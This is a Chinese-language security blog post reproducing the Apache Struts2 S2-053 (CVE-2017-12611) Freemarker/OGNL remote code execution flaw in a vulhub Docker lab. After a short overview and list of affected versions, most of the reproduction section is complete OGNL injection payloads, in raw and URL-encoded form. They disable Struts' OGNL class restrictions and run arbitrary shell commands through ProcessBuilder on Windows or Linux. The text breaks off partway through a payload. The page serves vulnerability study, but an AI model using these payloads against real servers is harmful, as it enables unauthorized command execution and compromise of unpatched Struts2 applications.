<!DOCTYPE html><html lang="zh-HK"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="CygneNoir" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="CygneNoir" type="application/atom+xml"><link rel="alternate" type="application/json" title="CygneNoir" href="http://example.com/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="preconnect" href="https://smms.app"/><link rel="preconnect" href="https://s2.loli.net"/><link rel="dns-prefetch" href="https://smms.app"/><link rel="dns-prefetch" href="https://s5.qhres2.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.11"><link rel="modulepreload" href="/js/chunk-7H5EOBC5.js"></link><link rel="modulepreload" href="/js/chunk-CI6CXSTD.js"></link><link rel="modulepreload" href="/js/chunk-HRSYOQVR.js"></link><link rel="modulepreload" href="/js/chunk-QLKHT27H.js"></link><link rel="modulepreload" href="/js/chunk-TMAGBQKU.js"></link><link rel="modulepreload" href="/js/chunk-WIQECBEN.js"></link><link rel="modulepreload" href="/js/comments-HHYC53BB.js"></link><link rel="modulepreload" href="/js/copy-tex-B6KHKVWB.js"></link><link rel="modulepreload" href="/js/index.esm-2WCA7E2A.js"></link><link rel="modulepreload" href="/js/post-F34BHNQ4.js"></link><link rel="modulepreload" href="/js/quicklink-3I3HFDVM.js"></link><link rel="modulepreload" href="/js/search-ST5R6ZQG.js"></link><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/waline-2AUA5EA7.js"></link><link rel="stylesheet" href="/css/comments-SJZAII77.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="stylesheet" href="/css/waline-ZFRMIHOE.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="https://fp1.fghrsh.net/2019/01/05/a328aca6194c81720597d6cf715b1c1a.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://cdna.artstation.com/p/assets/images/images/000/826/910/large/wl-op-100-s.jpg?1443931462" as="image" fetchpriority="high"><link rel="preload" href="https://fp1.fghrsh.net/2016/03/13/1e1417dec7f35310dc1bf8ad7938d94c.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://fp1.fghrsh.net/2019/01/05/d16eeaa60441d8b5d98ed5495e2c364b.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://fp1.fghrsh.net/2019/01/05/e9ed3aefb30a18e35da4785b1c4eeb2f.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://fp1.fghrsh.net/2019/06/20/6d97d3301830cb1a4a773892f97e35d4.jpg" as="image" fetchpriority="high"><meta name="keywords" content="CVE"/><meta name="description" content="2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下， 当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞，存在一定的安全风险。"/><link rel="canonical" href="http://example.com/2024/09/05/CVE/Struts2/CVE-2017-12611%20Struts2%20Freemarker%20%E6%A0%87%E7%AD%BE%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E%20S2-053/"><title>CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053</h1><div class="meta"><span class="item" title="創建時間：2024-09-05 13:46:51"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">發表於</span><time itemprop="dateCreated datePublished" datetime="2024-09-05T13:46:51+08:00">2024-09-05</time></span><span class="item" title="本文字數"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字數</span><span>13k</span><span class="text">字</span></span><span class="item" title="閱讀時長"><span class="icon"><i class="ic i-clock"></i></span><span class="text">閱讀時長</span><span>12 分鐘</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切換導航欄"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Young men are fearless, neither seeking fame nor avoiding dust.</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://fp1.fghrsh.net/2019/01/05/a328aca6194c81720597d6cf715b1c1a.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://cdna.artstation.com/p/assets/images/images/000/826/910/large/wl-op-100-s.jpg?1443931462&quot;);"></li><li class="item" style="background-image: url(&quot;https://fp1.fghrsh.net/2016/03/13/1e1417dec7f35310dc1bf8ad7938d94c.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://fp1.fghrsh.net/2019/01/05/d16eeaa60441d8b5d98ed5495e2c364b.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://fp1.fghrsh.net/2019/01/05/e9ed3aefb30a18e35da4785b1c4eeb2f.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://fp1.fghrsh.net/2019/06/20/6d97d3301830cb1a4a773892f97e35d4.jpg&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首頁</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Struts2-Freemarker/" itemprop="item" rel="index" title="分類於Struts2 Freemarker"><span itemprop="name">Struts2 Freemarker<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Struts2-Freemarker/CVE/" itemprop="item" rel="index" title="分類於CVE"><span itemprop="name">CVE<meta itemprop="position" content="1"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-HK"><link itemprop="mainEntityOfPage" href="http://example.com/2024/09/05/CVE/Struts2/CVE-2017-12611%20Struts2%20Freemarker%20%E6%A0%87%E7%AD%BE%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E%20S2-053/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="CygneNoir"/><meta itemprop="description" content="赌徒去往哪儿里，那里就是赌场。, 赌徒去往哪儿里，那里就是赌场。"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="CygneNoir"/></span><div class="body md" itemprop="articleBody"><p><div class="links"><div class="item" title="美式加糖" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peace-and-romance/p/15652528.html" class="image" data-background-image="https://s2.loli.net/2024/09/05/4aFXTZid7cQVtjN.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://www.cnblogs.com/peace-and-romance/p/15652528.html" class="title">CVE-2017-12611 S2-053 复现</a>
        <p class="desc">Struts2 在使用 Freemarker 模板引擎的时候，同时允许解析 OGNL 表达式。导致用户输入的数据本身不会被 OGNL 解析，但由于被 Freemarker 解析一次后变成离开一个表达式，被 OGNL 解析第二次，导致任意命令执行漏洞。</p>
        </div></div><div class="item" title="用户 8478947" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2197868" class="image" data-background-image="/assets/404.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2197868" class="title">CVE-2017-12611 S2-053 远程代码执行漏洞</a>
        <p class="desc">Struts2 在使用 Freemarker 模块引擎的时候,同时允许解析 OGNL 表达式。导致用户输入的数据本身不会被 OGNL 解析,但是由于被 Freemarker 解析一次后变成离开一个表达式,被 OGNL 解析第二次,导致任意命令执行漏洞。</p>
        </div></div><div class="item" title="aliyun" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://developer.aliyun.com/ask/201858" class="image" data-background-image="/assets/404.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://developer.aliyun.com/ask/201858" class="title">【漏洞公告】CVE-2017-12611:Struts2 Freemarker 标签远程执行命令漏洞(S2-053)</a>
        <p class="desc">CVE-2017-12611:Struts2 Freemarker</p>
        </div></div><div class="item" title="weixin_34005042" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34005042/article/details/90356595" class="image" data-background-image="https://s2.loli.net/2024/09/05/gMtck9PdYUAbuni.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34005042/article/details/90356595" class="title">Struts2 再爆远程代码执行漏洞 CVE-2017-12611 S2-053</a>
        <p class="desc">CVE-2017-12611 S2-053</p>
        </div></div><div class="item" title="挖山" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://www.ancii.com/ah7llynq/" class="image" data-background-image="/assets/404.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://www.ancii.com/ah7llynq/" class="title">Apache Struts2 远程代码执行漏洞(S2-053)(CVE-2017-12611)</a>
        <p class="desc">Apache Struts2 远程代码执行漏洞(S2-053)(CVE-2017-12611)</p>
        </div></div><div class="item" title="E 安全" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://www.163.com/dy/article/CTODHNVA05128DFG.html" class="image" data-background-image="https://s2.loli.net/2024/09/05/YkyE3B9bvAXZq1I.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://www.163.com/dy/article/CTODHNVA05128DFG.html" class="title">Struts2 再爆远程代码执行漏洞 CVE-2017-12611，S2-053，建议升级到最新版本</a>
        <p class="desc">CVE-2017-12611、S2-053</p>
        </div></div><div class="item" title="蚁景网络安全" style="--block-color:#652121;"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/704092984" class="image" data-background-image="https://s2.loli.net/2024/09/05/Mo1yD35LjdYnCsz.png"></a>
        <div class="info">
        <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/704092984" class="title">Struts2 远程代码执行漏洞(CVE-2017-12611)</a>
        <p class="desc">2017 年 9 月 7 日，Struts 官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在 Freemarker 标签中使用错误的构造时，可能会导致远程代码执行漏洞。</p>
        </div></div></div></p>
<h1 id="x00-漏洞概述"><a class="anchor" href="#x00-漏洞概述">#</a> x00 漏洞概述</h1>
<p>CVE(CAN) ID: <a target="_blank" rel="noopener" href="https://www.ancii.com/link/v1/mn3q_iwy-7wjQqBQCKdMCLpz06Z4OUQO_fUcERh7UhknmACLtlwmMFpSNQ-fB7yroPN4iatYaZHlXQYhkHR5_ZWgUQBW8ceXAdzjtURQlwY/" title="CVE-2017-12611">CVE-2017-12611</a></p>
<p>Struts2 是构建企业级 Jave Web 应用的可扩展框架。</p>
<p>Struts 2.0.1 – Sturts 2.3.33、Struts 2.5 – Struts 2.5.10 存在一个远程代码执行漏洞，该漏洞源于在处理 Freemarker 标签时，如使程序员使用了不恰当的编码表达会导致远程代码执行。</p>
<p><strong>来源：Lupin （lupin1314@gmail dot com）<br />
David Greene （david at trumpetx dot com）<br />
Roland McIntosh</strong></p>
<p>链接：<a target="_blank" rel="noopener" href="https://www.ancii.com/link/v1/FCR6ELdsNptoVkZF9NvbL0957LG_cBJSLTSWUC6aDsk3z8al8Ro9GVh9waalNfc-CskWDL3DXZyRaZyevc5BWg/" title="https://cwiki.apache.org/confluence/display/WW/S2-053">https://cwiki.apache.org/confluence/display/WW/S2-053</a></p>
<h1 id="x01-影响范围"><a class="anchor" href="#x01-影响范围">#</a> x01 影响范围</h1>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tr><td data-num="1"></td><td><pre>Struts 2.0.1 -Struts 2.3.33</pre></td></tr><tr><td data-num="2"></td><td><pre>Struts 2.5 - Struts 2.5.10</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>Apache Group Struts 2.5-2.5.10</pre></td></tr><tr><td data-num="5"></td><td><pre>Apache Group Struts 2.0.1-2.3.33</pre></td></tr></table></figure><h1 id="x02-复现"><a class="anchor" href="#x02-复现">#</a> x02 复现</h1>
<p>测试是否存在漏洞，输入：%{33-1}, 成功执行返回 32，说明漏洞存在</p>
<p><img loading="lazy" data-src="https://pic4.zhimg.com/80/v2-cabe0da92e50e6d747a94511d438aa89_1440w.webp" alt="" /></p>
<p>发送需要执行的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;zhida_source=entity&amp;is_preview=1">恶意代码</a>，执行 “ifconfig” payload:</p>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tr><td data-num="1"></td><td><pre>%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</pre></td></tr></table></figure><p><img loading="lazy" data-src="https://pica.zhimg.com/80/v2-6aabdde5cef6f10dadf634dc5d83f76c_1440w.webp" alt="" /></p>
<hr />
<h2 id="环境搭建"><a class="anchor" href="#环境搭建">#</a> <strong>环境搭建</strong></h2>
<h3 id="环境概述"><a class="anchor" href="#环境概述">#</a> <strong>环境概述</strong></h3>
<ul>
<li>Linux 操作系统</li>
</ul>
<h3 id="搭建过程"><a class="anchor" href="#搭建过程">#</a> <strong>搭建过程</strong></h3>
<p>拉取镜像</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cd vulhub<span class="token operator">/</span>struts2<span class="token operator">/</span>s2<span class="token operator">-</span><span class="token number">053</span></pre></td></tr><tr><td data-num="2"></td><td><pre> docker<span class="token operator">-</span>compose up <span class="token operator">-</span>d</pre></td></tr></table></figure><p><img loading="lazy" data-src="https://developer.qcloudimg.com/http-save/8478947/6bd9d33005ebaa051dae24f86483c16d.png" alt="image-20221207154139972" /></p>
<p>image-20221207154139972</p>
<p>访问<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http%3A%2F%2F192.168.146.158%3A8053%2Fhello.action&amp;source=article&amp;objectId=2197868"> http://192.168.146.158:8053/hello.action</a></p>
<p><img loading="lazy" data-src="https://developer.qcloudimg.com/http-save/8478947/4f364dfa29eda2355617ac9c3f0f76b5.png" alt="image-20221207154652761" /></p>
<p>image-20221207154652761</p>
<h2 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> <strong>漏洞复现</strong></h2>
<p>根据 vulhub 官网的 poc，查看是否存在该漏洞。发现成功执行了删除 has vul 的语句，说明存在该漏洞。</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>redirectUri<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23dm<span class="token operator">%</span>3D<span class="token operator">%</span>40ognl<span class="token punctuation">.</span>OgnlContext<span class="token operator">%</span>40DEFAULT_MEMBER_ACCESS<span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23_memberAccess<span class="token operator">%</span>3F<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23_memberAccess<span class="token operator">%</span>3D<span class="token operator">%</span>23dm<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3A<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23container<span class="token operator">%</span>3D<span class="token operator">%</span>23context<span class="token operator">%</span>5B<span class="token operator">%</span>27com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ActionContext<span class="token punctuation">.</span>container<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token operator">%</span>3D<span class="token operator">%</span>23container<span class="token punctuation">.</span>getInstance<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil<span class="token operator">%</span>40class<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token punctuation">.</span>getExcludedPackageNames<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>clear<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token punctuation">.</span>getExcludedClasses<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>clear<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23context<span class="token punctuation">.</span>setMemberAccess<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23dm<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmd<span class="token operator">%</span>3D<span class="token operator">%</span>27echo<span class="token operator">%</span>20has<span class="token operator">%</span>20vul<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23iswin<span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token operator">%</span>40getProperty<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token punctuation">.</span>name<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>toLowerCase<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>contains<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27win<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmds<span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23iswin<span class="token operator">%</span>3F<span class="token operator">%</span>7B<span class="token operator">%</span>27cmd<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2Fc<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>23cmd<span class="token operator">%</span>7D<span class="token operator">%</span>3A<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2Fbin<span class="token operator">%</span>2Fbash<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>23cmd<span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23p<span class="token operator">%</span>3Dnew<span class="token operator">%</span>20java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmds<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23p<span class="token punctuation">.</span>redirectErrorStream<span class="token operator">%</span>28true<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23process<span class="token operator">%</span>3D<span class="token operator">%</span>23p<span class="token punctuation">.</span>start<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils<span class="token operator">%</span>40toString<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23process<span class="token punctuation">.</span>getInputStream<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>7D<span class="token operator">%</span>0A</pre></td></tr><tr><td data-num="2"></td><td><pre> ​</pre></td></tr><tr><td data-num="3"></td><td><pre> payload原型：</pre></td></tr><tr><td data-num="4"></td><td><pre> redirectUri<span class="token operator">=</span><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>#dm<span class="token operator">=</span>@ognl<span class="token punctuation">.</span>OgnlContext@<span class="token constant">DEFAULT_MEMBER_ACCESS</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">?</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">=</span>#dm<span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">(</span>#container<span class="token operator">=</span>#context<span class="token punctuation">[</span><span class="token string">'com.opensymphony.xwork2.ActionContext.container'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token operator">=</span>#container<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>@com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil@<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedPackageNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#context<span class="token punctuation">.</span><span class="token function">setMemberAccess</span><span class="token punctuation">(</span>#dm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmd<span class="token operator">=</span><span class="token string">'echo has vul'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#iswin<span class="token operator">=</span><span class="token punctuation">(</span>@java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System@<span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">'os.name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmds<span class="token operator">=</span><span class="token punctuation">(</span>#iswin<span class="token operator">?</span><span class="token punctuation">&#123;</span><span class="token string">'cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">&#125;</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder</span><span class="token punctuation">(</span>#cmds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#process<span class="token operator">=</span>#p<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>@org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils@<span class="token function">toString</span><span class="token punctuation">(</span>#process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="https://developer.qcloudimg.com/http-save/8478947/c9ef014697378c20b3bcdece57312eab.png" alt="image-20221207154821101" /></p>
<p>image-20221207154821101</p>
<p>访问漏洞 url 并且添加恶意 payload 进行抓包。</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>redirectUri<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23dm<span class="token operator">%</span>3D<span class="token operator">%</span>40ognl<span class="token punctuation">.</span>OgnlContext<span class="token operator">%</span>40DEFAULT_MEMBER_ACCESS<span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23_memberAccess<span class="token operator">%</span>3F<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23_memberAccess<span class="token operator">%</span>3D<span class="token operator">%</span>23dm<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3A<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23container<span class="token 